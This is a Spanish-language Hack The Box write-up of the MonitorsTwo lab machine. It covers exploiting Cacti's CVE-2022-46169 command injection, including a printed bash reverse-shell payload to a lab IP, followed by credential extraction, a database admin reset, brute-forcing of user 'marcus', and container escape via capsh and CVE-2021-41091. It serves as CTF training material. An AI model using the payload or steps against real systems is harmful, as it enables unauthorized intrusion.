---
title: Write-up MonitorsTwo [Easy] - Hack The Box
date: 2023-05-03
categories: [Writeups, Hack The Box]
tags: [writeup, hackthebox, machines, easy, pentesting]
image: /assets/img/hackthebox/machines/monitorstwo/monitorstwo.png
image_link: false
---

Publicación del write-up de sujeto a las [guías generales](https://help.hackthebox.com/en/articles/5188925-streaming-writeups-walkthrough-guidelines) de Hack The Box.

# Write-up MonitorsTwo \[Easy\] - Hack The Box
\\
**Mi perfil de Hack The Box: [julianglez16](https://app.hackthebox.com/users/1084561)**

# Enumeración


### Puertos


![Untitled.png](/assets/img/hackthebox/machines/monitorstwo/puertos1.png)
![Untitled.png](/assets/img/hackthebox/machines/monitorstwo/puertos2.png)

### Directorios web


![Untitled.png](/assets/img/hackthebox/machines/monitorstwo/directorios-web.png)


### Virtual hosts


### Tecnologías web


![Untitled.png](/assets/img/hackthebox/machines/monitorstwo/tecnologias-web.png)


### Funcionalidad web


![Untitled.png](/assets/img/hackthebox/machines/monitorstwo/funcionalidad-web1.png)
![Untitled.png](/assets/img/hackthebox/machines/monitorstwo/funcionalidad-web2.png)

### Análisis con BurpSuite


Al hacer login con credenciales `user:pass`


![Untitled.png](/assets/img/hackthebox/machines/monitorstwo/burpsuite.png)


# Explotación


### Usuario


Realizando la enumeración de directorios web se observa que existen varias URLs interesantes como por ejemplo `/docs/`, la cual lleva a una vista donde se expone la documentación de Cacti. De vuelta a la página de login se observa que la versión de Cacti utilizada es la versión `1.2.22`, la cual es vulnerable a _Command Injection_ (CVE-2022-46169). Desde esta web se puede ver una explicación técnica: [https://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution](https://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution/)


![Página de login donde se expone la versión de Cacti](/assets/img/hackthebox/machines/monitorstwo/usuario1.png)


Si se visita la URL `remote_agent.php` se recibe el mensaje de error mencionado en la web donde se habla del CVE al que es vulnerable Cacti.


![Untitled.png](/assets/img/hackthebox/machines/monitorstwo/usuario2.png)


Analizando dicha vulnerabilidad y con la ayuda de este exploit de github:  [https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit](https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit) se consigue obtener lo siguiente:


![Untitled.png](/assets/img/hackthebox/machines/monitorstwo/usuario3.png)


Con este resultado se determina que las variables para ejecutar el exploit sonç `host_id=1` y `local_data_id=6`. Tras conocer esto, con el siguiente payload inyectado en la petición GET:


```bash
; bash -c "bash -i >& /dev/tcp/10.10.14.116/1234 0>&1"
```


![Untitled.png](/assets/img/hackthebox/machines/monitorstwo/usuario4.png)


Se consigue un reverse shell y se obtiene acceso a la máquina como `www-data`.


![Untitled.png](/assets/img/hackthebox/machines/monitorstwo/usuario5.png)


Al analizar el fichero `/etc/passwd` se observa que no existen usuarios en la máquina


![Contenido del fichero /etc/passwd](/assets/img/hackthebox/machines/monitorstwo/usuario6.png)


Al hacer `ls` en el directorio `/` se observan 2 cosas interesantes: un fichero llamado `.dockerenv` y un fichero llamado `entrypoint.sh`, lo cual nos hace pensar que estamos dentro de un contenedor _Docker_. 


![Contenido del directorio /](/assets/img/hackthebox/machines/monitorstwo/usuario7.png)


En el fichero `entrypoint.sh` se observan unas credenciales de acceso a una base de datos `mysql` en el host `db`.


![Untitled.png](/assets/img/hackthebox/machines/monitorstwo/usuario8.png)


Para determinar la IP del host `db` se puede buscar en el fichero `/etc/hosts`


![Contenido del fichero](/assets/img/hackthebox/machines/monitorstwo/usuario9.png)


Como se pueden ejecutar comandos de manera remota en la base de datos, se extrae toda la información interesante y se guarda en ficheros txt (no puede upgradear el shell).


![Tablas existentes en la base de datos de Cacti](/assets/img/hackthebox/machines/monitorstwo/usuario10.png)


![Base de datos de usuarios Cacti](/assets/img/hackthebox/machines/monitorstwo/usuario11.png)

Si cambiamos las credenciales del usuario `admin` en la base de datos por las credenciales por defecto iniciales (`admin:admin`), se puede acceder desde el panel web a la cuenta de administración.


![Untitled.png](/assets/img/hackthebox/machines/monitorstwo/usuario12.png)


![Untitled.png](/assets/img/hackthebox/machines/monitorstwo/usuario13.png)


Tras hacer esto, se ve que no hay nada interesante dentro del panel de administrador. Aí que se intenta hacer fuerza bruta a la contraseña del usuario `marcus` exitosamente.


![Credenciales: marcus:funkymoney](/assets/img/hackthebox/machines/monitorstwo/usuario14.png)


![Untitled.png](/assets/img/hackthebox/machines/monitorstwo/usuario15.png)


### Root


Tras obtener el usuario, se buscan permisos de _sudo_, los grupos a los que pertenece el usuario `marcus` y binarios con permisos SUID. Ninguno de estos métodos revela algo útil.


![Untitled.png](/assets/img/hackthebox/machines/monitorstwo/root1.png)


Tampoco ningún crontab útil que se pueda aprovechar


![Untitled.png](/assets/img/hackthebox/machines/monitorstwo/root2.png)



En cuanto a los puertos abiertos, se observan dos puertos que coinciden con los contenedores _Docker_.


![Conexiones de la máquina](/assets/img/hackthebox/machines/monitorstwo/root3.png)


En el mail disponible del usuario `marcus` se observa que ha sido alertado de 3 vulnerabilidades peligrosas en la infraestructura. La interesante para escalar privilegios actualmente es la primera: `CVE-2021-33033` ya que la máquina a la que hemos accedido es vulnerable.


![Correo recibido del usuario marcus](/assets/img/hackthebox/machines/monitorstwo/root4.png)



![Distribución y versión de kernel de la máquina](/assets/img/hackthebox/machines/monitorstwo/root5.png)



En el mail se menciona el [https://github.com/UncleJ4ck/CVE-2021-41091](https://github.com/UncleJ4ck/CVE-2021-41091), cuya vulnerabilidad puede ser utilizada para escalar privilegios. Para poder explotar el _CVE-2021-41091_ se necesita escalar privilegios en el contenedor. Esto se realiza utilizando el binario `capsh` que tiene permisos _SUID_ dentro del contenedor. 


![Escalada de privilegios en el contenedor](/assets/img/hackthebox/machines/monitorstwo/root6.png)



Una vez como `root` en el contenedor, se accede a los directorios de los contenedores y se intenta ejecutar el comando `./bin/bash -p 2>/dev/null`


![Directorios de los contenedores vulnerables](/assets/img/hackthebox/machines/monitorstwo/root7.png)



![Intento sin éxito en el primer directorio Docker](/assets/img/hackthebox/machines/monitorstwo/root8.png)



![Intento existoso en el segundo directorio Docker](/assets/img/hackthebox/machines/monitorstwo/root9.png)


